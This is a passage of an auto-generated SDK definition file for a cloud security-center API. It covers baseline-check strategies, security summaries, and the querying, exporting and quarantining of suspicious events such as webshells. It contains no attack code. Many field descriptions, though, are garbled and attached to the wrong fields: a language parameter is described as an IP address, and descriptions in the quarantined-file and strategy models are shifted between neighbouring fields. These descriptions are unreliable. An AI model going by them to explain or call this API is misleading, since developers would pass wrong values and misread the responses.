                        paramType?: int32(name='ParamType', description='WB01224678', example='1'),
                        value?: string(name='Value', description='An array that consists of sub-risk items.', example='7'),
                      }
                    ](name='ParamList', description='The specified value of the rule parameter.'),
                    ruleDesc?: string(name='RuleDesc', description='The check item.', example='Please customize the password expiration time detection standard as'),
                    ruleId?: string(name='RuleId', description='Indicates whether the risk item is selected. Valid values:

*   **true**: yes
*   **false**: no', example='login_unlock_deny_pam_faillock.must.cus'),
                  }
                ](name='Rules', description='The ID of the baseline check policy.'),
              }
            ](name='CheckDetails', description='The data returned.'),
            on?: boolean(name='On', description='If the value of paramType is 2, this parameter provides the options that can be selected for the rule parameter.', example='false'),
            typeName?: string(name='TypeName', description='The description of the rule.', example='hc_exploit_redis'),
          }
        ](name='SubTypes', description='The information about the rule parameter.'),
        typeName?: string(name='TypeName', description='An array that consists of the details of custom check items.', example='hc_exploit'),
      }
    ](name='RiskTypeWhiteListQueryResultList', description='The check item.'),
    startTime?: string(name='StartTime', example='02:00:00'),
    targetType?: string(name='TargetType', example='groupId'),
    type?: int32(name='Type', description='The name of the rule parameter.', example='1'),
  }(name='Strategy', description='The source IP address of the request.'),
}

model DescribeStrategyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyDetailResponseBody(name='body'),
}

async function describeStrategyDetailWithOptions(request: DescribeStrategyDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyDetail(request: DescribeStrategyDetailRequest): DescribeStrategyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyDetailWithOptions(request, runtime);
}

model DescribeStrategyExecDetailRequest {
  currentPage?: int32(name='CurrentPage', example='1'),
  pageSize?: int32(name='PageSize', example='10'),
  sourceIp?: string(name='SourceIp', example='1.2.XX.XX'),
  strategyId?: int32(name='StrategyId', example='8437592'),
}

model DescribeStrategyExecDetailResponseBody = {
  endTime?: string(name='EndTime', example='2021-12-05 00:12:46'),
  failCount?: int32(name='FailCount', example='94'),
  failedEcsList?: [ 
    {
      IP?: string(name='IP', example='115.28.XX.XX'),
      instanceName?: string(name='InstanceName', example='worker-k8s-for-cs-cf5741fb95c3a45d0864f0e4544dc****'),
      internetIp?: string(name='InternetIp', example='115.28.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.31.XX.XX'),
      reason?: string(name='Reason', example='Detect timeout'),
    }
  ](name='FailedEcsList'),
  inProcessCount?: int32(name='InProcessCount', example='0'),
  percent?: string(name='Percent', example='100%'),
  requestId?: string(name='RequestId', example='01611D72-1E33-53F5-A9A5-C81B5561970F'),
  source?: string(name='Source', example='Manual'),
  startTime?: string(name='StartTime', example='2021-12-05 00:12:16'),
  successCount?: int32(name='SuccessCount', example='81'),
}

model DescribeStrategyExecDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyExecDetailResponseBody(name='body'),
}

async function describeStrategyExecDetailWithOptions(request: DescribeStrategyExecDetailRequest, runtime: Util.RuntimeOptions): DescribeStrategyExecDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyExecDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyExecDetail(request: DescribeStrategyExecDetailRequest): DescribeStrategyExecDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyExecDetailWithOptions(request, runtime);
}

model DescribeStrategyTargetRequest {
  config?: string(name='Config', description='WB01014029', example='{"strategyId":8167126}'),
  sourceIp?: string(name='SourceIp', description='Queries the information about the assets to which a baseline check policy is applied.', example='1.2.X.X'),
  type?: string(name='Type', description='DescribeStrategyTarget', example='hc_strategy'),
}

model DescribeStrategyTargetResponseBody = {
  requestId?: string(name='RequestId', example='001BAB34-D70A-54B0-B1D7-91B76DCDD8E8'),
  strategyTargets?: [ 
    {
      bindUuidCount?: int32(name='BindUuidCount', example='85'),
      flag?: string(name='Flag', example='add'),
      target?: string(name='Target', example='9165712'),
      targetType?: string(name='TargetType', example='groupId'),
    }
  ](name='StrategyTargets'),
}

model DescribeStrategyTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeStrategyTargetResponseBody(name='body'),
}

async function describeStrategyTargetWithOptions(request: DescribeStrategyTargetRequest, runtime: Util.RuntimeOptions): DescribeStrategyTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeStrategyTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeStrategyTarget(request: DescribeStrategyTargetRequest): DescribeStrategyTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeStrategyTargetWithOptions(request, runtime);
}

model DescribeSummaryInfoRequest {
  lang?: string(name='Lang', description='192.168.XX.XX', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
}

model DescribeSummaryInfoResponseBody = {
  aegisClientOfflineCount?: int32(name='AegisClientOfflineCount', description='WB01014029', example='12'),
  aegisClientOnlineCount?: int32(name='AegisClientOnlineCount', example='127'),
  requestId?: string(name='RequestId', description='Queries the security information about your assets. The information includes the security score and the numbers of protected and unprotected assets.', example='D40198E1-6EA8-482E-B3C7-D9573D75C0CA'),
  securityScore?: int32(name='SecurityScore', example='44'),
  success?: boolean(name='Success', description='DescribeSummaryInfo', example='true'),
}

model DescribeSummaryInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSummaryInfoResponseBody(name='body'),
}

async function describeSummaryInfoWithOptions(request: DescribeSummaryInfoRequest, runtime: Util.RuntimeOptions): DescribeSummaryInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSummaryInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSummaryInfo(request: DescribeSummaryInfoRequest): DescribeSummaryInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSummaryInfoWithOptions(request, runtime);
}

model DescribeSupportRegionResponseBody = {
  requestId?: string(name='RequestId', example='2C0699D3-4107-5A46-A4C4-E129A5967788'),
  supportRegion?: [ string ](name='SupportRegion'),
}

model DescribeSupportRegionResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSupportRegionResponseBody(name='body'),
}

async function describeSupportRegionWithOptions(runtime: Util.RuntimeOptions): DescribeSupportRegionResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeSupportRegion',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSupportRegion(): DescribeSupportRegionResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSupportRegionWithOptions(runtime);
}

model DescribeSuspEventDetailRequest {
  from?: string(name='From', description='The data source of the exception. Set the value to sas.', example='sas'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='121.33.XX.XX'),
  suspiciousEventId?: int32(name='SuspiciousEventId', description='The ID of the exception.', example='32750999'),
}

model DescribeSuspEventDetailResponseBody = {
  canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online processing of exceptions is supported, such as blocking an exception, adding an exception to the whitelist, and ignoring an exception. Valid values:

*   **true**: The online processing of exceptions is supported.
*   **false**: The online processing of exceptions is not supported.', example='true'),
  dataSource?: string(name='DataSource', description='The data source of the exception.', example='aegis_suspicious_****'),
  details?: [ 
    {
      nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Trojan Path'),
      type?: string(name='Type', description='The format in which the details of the exception are displayed.

Valid values:

*   **text**
*   **html**', example='html'),
      value?: string(name='Value', description='The attribute information about the exception. For example, if the exception is associated with an alert that is triggered by an unusual logon, the information can include the time when the logon is initiated and the location from which the logon is initiated. If the exception is associated with an alert that is triggered by a webshell file, the information can include the path of the trojan file and the type of the trojan.', example='getopt'),
    }
  ](name='Details', description='An array that consists of the details of the exception.'),
  eventDesc?: string(name='EventDesc', description='The description of the exception.', example='The detection model found a suspicious Webshell file on your server, which may be a backdoor file implanted to maintain permissions after the attacker successfully invaded the website.'),
  eventName?: string(name='EventName', description='The name of the exception.', example='WEBSHELL'),
  eventStatus?: string(name='EventStatus', description='The status of the exception. Valid values:

*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: handling
*   **32**: handled
*   **64**: expired', example='1'),
  eventTypeDesc?: string(name='EventTypeDesc', description='The type of the exception.', example='Malicious Software-Variable Trojan'),
  id?: int32(name='Id', description='The ID of the exception.', example='11416624'),
  instanceName?: string(name='InstanceName', description='The name of the server on which the exception was detected.', example='ca_cpm_****'),
  internetIp?: string(name='InternetIp', description='The public IP address of the server on which the exception was detected.', example='101.132.XX.XX'),
  intranetIp?: string(name='IntranetIp', description='The private IP address of the server on which the exception was detected.', example='172.26.XX.XX'),
  lastTime?: string(name='LastTime', description='The time when the exception was last detected.', example='2018-10-30 11:43:46'),
  level?: string(name='Level', description='The risk level of the exception. Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  operateErrorCode?: string(name='OperateErrorCode', description='The code that indicates the handling result of the exception.', example='quara.Succes'),
  operateMsg?: string(name='OperateMsg', description='The message that indicates the handling result of the exception.', example='success'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF46038'),
  saleVersion?: string(name='SaleVersion', description='The edition of Security Center in which the exception can be detected. Valid values:

*   **0**: Basic edition
*   **1**: Advanced edition
*   **2**: Enterprise edition', example='1'),
  uuid?: string(name='Uuid', description='The UUID of the server on which the exception was detected.', example='bffb12c3-590a-4db2-b538-****'),
}

model DescribeSuspEventDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventDetailResponseBody(name='body'),
}

async function describeSuspEventDetailWithOptions(request: DescribeSuspEventDetailRequest, runtime: Util.RuntimeOptions): DescribeSuspEventDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.suspiciousEventId)) {
    query['SuspiciousEventId'] = request.suspiciousEventId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventDetail(request: DescribeSuspEventDetailRequest): DescribeSuspEventDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventDetailWithOptions(request, runtime);
}

model DescribeSuspEventExportInfoRequest {
  exportId?: int32(name='ExportId', description='The ID of the export task.

> You can call the [ExportSuspEvents](~~ExportSuspEvents~~) operation to query the ID.', example='123'),
}

model DescribeSuspEventExportInfoResponseBody = {
  exportStatus?: string(name='ExportStatus', description='The handling status for the exception. Valid values:

*   **processing**: in progress
*   **success**: successful
*   **failed**: failed
*   **pending**: pending', example='success'),
  fileName?: string(name='FileName', description='The name of the exported file.', example='suspicious_event_20221221_1671590521234.zip'),
  gmtCreate?: long(name='GmtCreate', description='The time when the export task was created.', example='2022-12-20T15:18Z'),
  gmtModified?: long(name='GmtModified', description='The time when the export task was modified.', example='2022-12-20T15:18Z'),
  id?: int32(name='Id', description='The ID of the export task.', example='11'),
  link?: string(name='Link', description='The URL at which you can download the exported Excel file.', example='http://suspicious-xxxxxxx.oss-cn-shanghai.aliyuncs.com/xxxxxxxxxxx/suspicious_event_20221221_1671590525269.zip?Expires=1671594125&OSSAccessKeyId=LTAIxxxxxxxxxxxxxx&Signature=xxxxxxxxxxxxxxxxxx'),
  progress?: int32(name='Progress', description='The progress percentage of the export task.', example='100'),
  properties?: string(name='Properties', description='The exported parameters of exceptions.', example='id,eventSubType,eventDetail,level,status,ip,instanceName,desc,lastTime,operateTime,note'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='BE120DAB-F4E7-4C53-ADC3-A97578AXXXXX'),
  totalCount?: int32(name='TotalCount', description='The total number of exceptions exported.', example='1'),
  type?: string(name='Type', description='The type of the export task. The value is fixed as suspiciousEvent.', example='suspiciousEvent'),
}

model DescribeSuspEventExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventExportInfoResponseBody(name='body'),
}

async function describeSuspEventExportInfoWithOptions(request: DescribeSuspEventExportInfoRequest, runtime: Util.RuntimeOptions): DescribeSuspEventExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventExportInfo(request: DescribeSuspEventExportInfoRequest): DescribeSuspEventExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventExportInfoWithOptions(request, runtime);
}

model DescribeSuspEventQuaraFilesRequest {
  currentPage?: string(name='CurrentPage', description='The page number of the returned page.', example='1'),
  from?: string(name='From', description='The number of entries returned per page.', example='sas'),
  groupId?: string(name='GroupId', description='The ID of the request source. Set the value to **sas**.', example='10541428', deprecated='true'),
  groupingId?: long(name='GroupingId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='11472451'),
  pageSize?: string(name='PageSize', description='The unique ID of the quarantined file.', example='20'),
  quaraTag?: string(name='QuaraTag', description='The ID of the server group to which the server belongs. The quarantined file is located on the server.', example='a31337789f64d39b2219733ec99f9af7'),
  sourceIp?: string(name='SourceIp', description='The ID of the asset group.', example='59.82.XX.XX'),
  status?: string(name='Status', description='The number of the page to return.', example='quaraDone'),
}

model DescribeSuspEventQuaraFilesResponseBody = {
  count?: int32(name='Count', description='The download link of the quarantined file.', example='7'),
  currentPage?: int32(name='CurrentPage', description='The total number of entries returned.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned on the current page.', example='20'),
  quaraFiles?: [ 
    {
      eventName?: string(name='EventName', description='The unique ID of the event.', example='WEBSHELL'),
      eventType?: string(name='EventType', description='The MD5 hash value of the quarantined file.', example='WebshellQuaraEventType'),
      id?: int32(name='Id', description='172.16.XX.XX', example='26918'),
      instanceId?: string(name='InstanceId', description='The name of the server on which the quarantined file is located.', example='i-2ze9t1qp36n1436m****'),
      instanceName?: string(name='InstanceName', description='The ID of the quarantined file.', example='iZwz98dkiw3vbrtqrt5v****'),
      internetIp?: string(name='InternetIp', description='The instance ID of the asset.', example='47.XX.XX.131'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip', description='The UUID of the server.', example='47.XX.XX.131'),
      link?: string(name='Link', description='The public IP address of the server on which the quarantined file is located.', example='https://xxx.xxx/xxx'),
      md5?: string(name='Md5', description='The private IP address of the server on which the quarantined file is located.', example='5ddebe926acc7ed39a664409bfd0ec10'),
      modifyTime?: string(name='ModifyTime', example='2020-06-11 20:37:08'),
      path?: string(name='Path', description='The time when the quarantined file was last modified.', example='/var/www/html/webshell-sample-master/others/defc3e21bab59e2a2ab49f7eda99f65f83d4d349.jpg'),
      status?: string(name='Status', description='The public IP address of the server on which the quarantined file is located.', example='rollbackDone'),
      tag?: string(name='Tag', description='The type of the event.', example='228f890e56eae9eec6a42c7ea801b538'),
      uuid?: string(name='Uuid', description='The path to the quarantined file on the server.', example='04a0e735-ad32-4835-b635-0458d77b****'),
    }
  ](name='QuaraFiles', description='The status of the quarantined file. Valid values:

*   **quaraFailed**: The file fails to be quarantined.
*   **quaraDone**: The file is quarantined.
*   **quaraing**: The file is being quarantined.
*   **rollbackFailed**: The system fails to cancel quarantining the file.
*   **rollbackDone**: The system cancelled quarantining the file.
*   **rollbacking**: The system is cancelling quarantining the file.'),
  requestId?: string(name='RequestId', description='An array that consists of the quarantined files.', example='32A73759-4C0F-4801-BE98-901223ACEE9A'),
  totalCount?: int32(name='TotalCount', description='The quarantined file.', example='38'),
}

model DescribeSuspEventQuaraFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventQuaraFilesResponseBody(name='body'),
}

async function describeSuspEventQuaraFilesWithOptions(request: DescribeSuspEventQuaraFilesRequest, runtime: Util.RuntimeOptions): DescribeSuspEventQuaraFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.groupingId)) {
    query['GroupingId'] = request.groupingId;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.quaraTag)) {
    query['QuaraTag'] = request.quaraTag;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventQuaraFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventQuaraFiles(request: DescribeSuspEventQuaraFilesRequest): DescribeSuspEventQuaraFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventQuaraFilesWithOptions(request, runtime);
}

model DescribeSuspEventUserSettingRequest {
  from?: string(name='From', description='The ID of the request source. Set the value to **sas**.', example='sas'),
  id?: int32(name='Id', description='The ID. You do not need to specify this parameter.', example='123'),
  sourceIp?: string(name='SourceIp', description='The IP address of the request. You do not need to specify this parameter.', example='127.0.XX.XX'),
}

model DescribeSuspEventUserSettingResponseBody = {
  levelsOn?: [ string ](name='LevelsOn', description='An array that consists of the risk levels of alert notifications. Valid values:

*   **remind**
*   **suspicious**
*   **serious**'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='028CF634-5268-5660-9575-48C9ED6XXXXX'),
}

model DescribeSuspEventUserSettingResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeSuspEventUserSettingResponseBody(name='body'),
}

async function describeSuspEventUserSettingWithOptions(request: DescribeSuspEventUserSettingRequest, runtime: Util.RuntimeOptions): DescribeSuspEventUserSettingResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeSuspEventUserSetting',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeSuspEventUserSetting(request: DescribeSuspEventUserSettingRequest): DescribeSuspEventUserSettingResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeSuspEventUserSettingWithOptions(request, runtime);
}

model DescribeSuspEventsRequest {
  alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The ID of the alert event.

>  To query the details about the exceptions of an alert event, you must specify the ID of the alert event. You can call the [DescribeSuspEvents](~~DescribeSuspEvents~~) operation to query the IDs of alert events.', example='8df914418f4211fb****'),
  assetsTypeList?: [ string ](name='AssetsTypeList', description='The types of assets.'),
  clusterId?: string(name='ClusterId', description='The ID of the cluster of whose alert events you want to query.', example='c4af4fdf38a98496a9b63c2be5dae****'),
  containerFieldName?: string(name='ContainerFieldName', description='The key of the condition that is used to query alert events on containers. Valid values:

*   **instanceId**: the ID of the asset
*   **appName**: the name of the application
*   **clusterId**: the ID of the cluster
*   **regionId**: the ID of the region
*   **nodeName**: the name of the node
*   **namespace**: the namespace
*   **clusterName**: the name of the cluster
*   **image**: the name of the image
*   **imageRepoName**: the name of the image repository
*   **imageRepoNamespace**: the namespace to which the image repository belongs
*   **imageRepoTag**: the tag that is added to the image
*   **imageDigest**: the digest of the image', example='instanceId'),
  containerFieldValue?: string(name='ContainerFieldValue', description='The value of the condition that is used to query alert events on containers.', example='ccf9769c22b844ff9b8d57417683b****'),
  currentPage?: string(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  dealed?: string(name='Dealed', description='Specifies whether the alert event is handled. Valid values:

*   **N**: unhandled
*   **Y**: handled', example='N'),
  eventNames?: string(name='EventNames', description='The subtype of the alert event. Separate multiple subtypes with commas (,).', example='WEBSHELL'),
  from?: string(name='From', description='The data source of the alert event. Set the value to sas.', example='sas'),
  groupId?: long(name='GroupId', description='The ID of the asset group to which the affected asset belongs.', example='18768'),
  id?: long(name='Id', description='The ID of the alert event.', example='123'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the alert event. Separate multiple severities with commas (,). Valid values:

*   **serious**
*   **suspicious**
*   **remind**', example='serious'),
  name?: string(name='Name', description='The name of the asset that is affected by the alert event.', example='ecs-xxx'),
  operateErrorCodeList?: [ string ](name='OperateErrorCodeList', description='An array that consists of the handling result codes of alert events.'),
  operateTimeEnd?: string(name='OperateTimeEnd', description='The timestamp when the handling operation ends.', example='2022-07-06 13:50:38'),
  operateTimeStart?: string(name='OperateTimeStart', description='The timestamp when the handling operation starts.', example='2022-07-05 13:50:38'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  parentEventTypes?: string(name='ParentEventTypes', description='The alert type of the alert event. Valid values:

*   **Suspicious process**
*   **Webshell**
*   **Unusual logon**
*   **Exception**
*   **Sensitive file tampering**
*   **Malicious process (cloud threat detection)**
*   **Suspicious network connection**
*   **Suspicious account**
*   **Application intrusion event**
*   **Cloud threat detection**
*   **Precise defense**
*   **Application whitelist**
*   **Persistent webshell**
*   **Web application threat detection**
*   **Malicious script**
*   **Threat intelligence**
*   **Malicious network activity**
*   **Cluster exception**
*   **Webshell (on-premises threat detection)**
*   **Vulnerability exploitation**
*   **Malicious process (on-premises threat detection)**
*   **Trusted exception**
*   **Operations to manage other resources**', example='Webshell'),
  remark?: string(name='Remark', description='The name of the alert or the information about the asset.

>  Fuzzy search is supported. The asset information includes the name, public IP address, and private IP address of an asset.', example='192.168.XX.XX'),
  sortColumn?: string(name='SortColumn', description='The custom sorting field. Default value: **operateTime**. Valid values:

*   **lastTime**: the latest occurrence time.
*   **operateTime**: the handling time.

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='operateTime'),
  sortType?: string(name='SortType', description='The custom sorting order. Default value: **desc**. Valid values:

*   **asc**: the ascending order
*   **desc**: the descending order

>  This parameter takes effect if you set the **Dealed** parameter to Y.', example='desc'),
  source?: string(name='Source', description='The source of the alert.', example='aegis_suspicious_file_v2'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.168.XX.XX'),
  status?: string(name='Status', description='The status of the alert event. Valid values:

*   **0**: all
*   **1**: pending handling
*   **2**: ignored
*   **4**: confirmed
*   **8**: marked as a false positive
*   **16**: being handled
*   **32**: handled
*   **64**: expired
*   **128**: deleted
*   **512**: being automatically blocked
*   **513**: automatically blocked', example='1'),
  tacticId?: string(name='TacticId', description='The tactic ID of ATT\\&CK.', example='TA0001'),
  targetType?: string(name='TargetType', description='The item that is used to search for the container. Valid values:

*   **containerId**: the ID of the container
*   **uuid**: the UUID of the server
*   **imageUuid**: the UUID of the image', example='containerId'),
  timeEnd?: string(name='TimeEnd', description='The end time when the alert event was last detected.', example='2022-07-06 13:50:38'),
  timeStart?: string(name='TimeStart', description='The start time when the alert event was last detected.', example='2022-07-05 13:50:38'),
  uniqueInfo?: string(name='UniqueInfo', description='The unique key of the alert.', example='73fc06fb175a7405697e402f52864****'),
  uuids?: string(name='Uuids', description='The UUID of the server on which the alert is detected. Separate multiple UUIDs with commas (,).', example='bb5d2484-f10e-450d-8917-3e79667e****,0e7c2fcd-7100-42c7-a21a-db6e4f32****'),
}

model DescribeSuspEventsResponseBody = {
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='20'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries returned per page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0D6E20E4-8326-1D03-A553-2182BE9E82F9'),
  suspEvents?: [ 
    {
      advanced?: boolean(name='Advanced', description='Indicates whether the alert was analyzed offline.', example='true'),
      alarmEventName?: string(name='AlarmEventName', description='The name of the alert event.', example='login_common_location'),
      alarmEventNameDisplay?: string(name='AlarmEventNameDisplay', description='The description of the alert event to which the alert event is associated.', example='Login with unusual location'),
      alarmEventType?: string(name='AlarmEventType', description='The type of the alert event.', example='Unusual Logon'),
      alarmEventTypeDisplay?: string(name='AlarmEventTypeDisplay', description='The type of the alert event.', example='Unusual Logon'),
      alarmUniqueInfo?: string(name='AlarmUniqueInfo', description='The ID of the alert event.', example='8df914418f****'),
      appName?: string(name='AppName', description='The name of the application to which the alert event belongs.', example='pro-deploy-tibasic'),
      autoBreaking?: boolean(name='AutoBreaking', description='Indicates whether the exception is automatically blocked.', example='true'),
      canBeDealOnLine?: boolean(name='CanBeDealOnLine', description='Indicates whether the online handling of the alert event is supported, such as quarantining the source file of the malicious process. Valid values:

*   **true**: yes
*   **false**: no', example='true'),
      canCancelFault?: boolean(name='CanCancelFault', description='Indicates whether you can cancel marking the alert event as a false positive.', example='false'),
      containHwMode?: boolean(name='ContainHwMode', description='Indicates whether the Safeguard Mode For Major Activities mode is enabled for the server. Valid values:

*   **true**: yes
*   **false**: no', example='false'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='container_1648601865161_14925_02_000****'),
      containerImageId?: string(name='ContainerImageId', description='The ID of the image to which the container belongs.', example='sha256:2e5a3b0ae5f452b3cb458789a9a7542ef40035a84318469a8528c5e444db1****'),
      containerImageName?: string(name='ContainerImageName', description='The name of the container image.', example='centos7_apache:v1.0.1'),
      dataSource?: string(name='DataSource', description='The source of data. This parameter can be ignored.', example='aegis_suspicious_****'),
      desc?: string(name='Desc', description='The impact of the alert event.', example='webshell'),
      details?: [ 
        {
          nameDisplay?: string(name='NameDisplay', description='The display name of the alert event.', example='Login with unusual location'),
